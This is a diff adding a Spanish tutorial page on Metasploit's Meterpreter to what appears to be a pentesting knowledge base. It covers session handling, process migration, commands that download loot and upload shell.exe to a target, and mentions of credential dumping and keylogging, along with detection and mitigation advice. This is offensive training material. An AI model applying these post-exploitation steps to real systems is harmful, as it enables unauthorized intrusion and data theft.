@@ -1,0 +1,116 @@
+---
+title: Vivir en el objetivo con meterpreter
+summary: El payload avanzado de Metasploit, por qué corre en memoria, la orientación de una sesión nueva, migrar de proceso, los dos sistemas de ficheros y las variantes pobres de PHP o Java.
+date: 2026-10-28
+area: metasploit
+order: 60
+related: [metasploit/payloads, metasploit/post-windows, metasploit/post-linux, meterpreter-orientation, meterpreter-migrate, meterpreter-search-files]
+tags: [metasploit, meterpreter, post-explotacion]
+---
+
+## Qué es
+
+**Meterpreter** es el payload avanzado de Metasploit: un intérprete de comandos interactivo que corre
+**en memoria** sobre el proceso explotado (en Windows, por inyección de DLL), sin tocar el disco, lo
+que lo hace difícil de detectar. Habla con tu Kali por el socket del stager, cifrado. Lo sacas en
+cuanto tienes un foothold: es donde vives toda la post-explotación, porque da enumeración, manejo de
+ficheros, escalada, volcado de credenciales, keylogging, pivoting y persistencia en una sola sesión,
+con comandos cortos en vez de pelearte con una shell cruda sin TTY.
+
+No es una herramienta que lances desde la terminal: es el `PAYLOAD` que eliges en un exploit o en
+[msfvenom](/biblia/metasploit/payloads/). No confundir con la consola: `msfconsole` es desde donde
+lanzas el exploit, meterpreter es la sesión que te devuelve *dentro* del objetivo. El prompt cambia de
+`msf >` a `meterpreter >`.
+
+## Llegar y manejar la sesión
+
+Un exploit con éxito imprime `Meterpreter session 1 opened`. A partir de ahí:
+
+```text
+msf > sessions -l          # listar las sesiones abiertas
+msf > sessions -i 1        # entrar en la sesión 1
+meterpreter > background   # (o Ctrl+Z) al fondo, sin cerrarla, vuelve a msf
+meterpreter > help         # el catálogo entero por categorías
+```
+
+`sessions -k 1` cierra una sesión; `exit`, la actual. Y recuerda: las sesiones se pierden si cierras
+`msfconsole`, así que para trabajo largo deja los handlers con `run -j`.
+
+## Orientación: antes de tocar nada
+
+Lo primero en una sesión nueva es saber quién eres, dónde estás y con qué privilegios:
+
+<Cmd id="meterpreter-orientation" />
+
+`getuid` con `NT AUTHORITY\SYSTEM` (Windows) o `root` (Linux) es la meta; un usuario normal significa
+que toca escalar. En `getprivs`, un `SeImpersonatePrivilege` o `SeDebugPrivilege` es una ruta directa
+a SYSTEM. Y la red, que delata si hay una segunda subred que pivotar:
+
+<Cmd id="meterpreter-network" />
+
+## Migrar de proceso
+
+La gotcha número uno de "se me cae meterpreter solo": **la sesión muere si muere su proceso**. Si
+caíste en el proceso del servicio explotado (un worker web que se reinicia), migra cuanto antes a algo
+estable:
+
+<Cmd id="meterpreter-migrate" />
+
+Migrar también sirve para el sigilo y para la arquitectura: siendo administrador, migrar a un proceso
+de SYSTEM te da SYSTEM; migrar a un proceso de 64 bits arregla un meterpreter de 32 bits que no puede
+con `kiwi` ni ciertos comandos. Para el keylogging, se migra al proceso del usuario (ver
+[post en Windows](/biblia/metasploit/post-windows/)).
+
+## Los dos sistemas de ficheros
+
+Hay **dos**: el remoto (el objetivo, comandos normales) y el local (tu Kali, los mismos prefijados con
+`l`). Los `l*` importan para saber de dónde sale un `upload` y a dónde cae un `download`.
+
+```text
+meterpreter > pwd / ls / cd / cat <f>     # en el objetivo
+meterpreter > lpwd / lls / lcd <dir>       # en TU Kali, sin salir de la sesión
+meterpreter > download C:\\loot\\secreto.txt   # objetivo -> local (cae en lpwd)
+meterpreter > upload shell.exe C:\\Windows\\Temp\\   # local -> objetivo (sale de lcd)
+meterpreter > edit / rm <f>                # editar (vi) o borrar en el objetivo
+meterpreter > getenv PATH                  # variable de entorno sin caer a shell
+meterpreter > shell                        # caer a cmd.exe / bash crudo
+```
+
+Para buscar ficheros por todo el disco, con `-d` para acotar la carpeta y bajar el ruido:
+
+<Cmd id="meterpreter-search-files" />
+
+## La escalada y el botín, en su nota
+
+Desde aquí, la post-explotación se bifurca por sistema. `getsystem`, los módulos post, el volcado de
+credenciales y la persistencia de Windows están en [post en Windows](/biblia/metasploit/post-windows/);
+los de Linux, en [post en Linux](/biblia/metasploit/post-linux/); y el pivoting (`autoroute`,
+`portfwd`), en [pivoting](/biblia/metasploit/pivoting/).
+
+## Gotchas
+
+- **Arquitectura.** Un meterpreter x86 en un Windows x64 va justo: `kiwi` y migrar a procesos x64
+  fallan. Migra a un proceso de 64 bits o genera el payload x64 desde el principio.
+- **Redirección WOW64.** Un meterpreter de 32 bits no ve el `System32` real: Windows lo redirige a
+  `SysWOW64`, así que un `search` sobre System32 mira la carpeta equivocada. Migra a un proceso x64, o
+  apunta a `C:\Windows\Sysnative\`.
+- **Variantes pobres.** Cuando el foothold es una web (RCE en PHP, Java), el payload es
+  `php/meterpreter` o `java/meterpreter` y la sesión **no trae** `migrate`, `getsystem`, `hashdump` ni
+  `load kiwi`: solo lo básico (ficheros, `download`/`upload`, `search`, `shell`). Para
+  post-explotación seria, cae a `shell`, estabiliza y sube a un meterpreter nativo del sistema.
+
+## Cómo se detecta
+
+Meterpreter no toca disco, pero sí la red y la memoria. El tráfico del stager y el patrón de
+latido (*keep-alive*) de la sesión los reconocen las reglas de IDS para Metasploit. Un EDR ve la
+inyección de DLL, la migración entre procesos (sobre todo hacia `lsass.exe` o `winlogon.exe`) y las
+llamadas de `getsystem` por named pipe. El `upload` de un `.exe` a `C:\Windows\Temp` deja un fichero
+en disco que el antivirus puede marcar.
+
+## Cómo se mitiga
+
+- **EDR con detección en memoria**: es la defensa real contra un payload que no toca disco.
+- **Vigilar la migración de procesos**: una inyección de código entre procesos no relacionados, y
+  cualquier cosa que abra un handle sobre `lsass.exe`, es una alerta de alto valor.
+- **Mínimos privilegios y control de egress**, como en [payloads](/biblia/metasploit/payloads/): sin
+  SYSTEM y sin ruta de salida, meterpreter hace mucho menos.
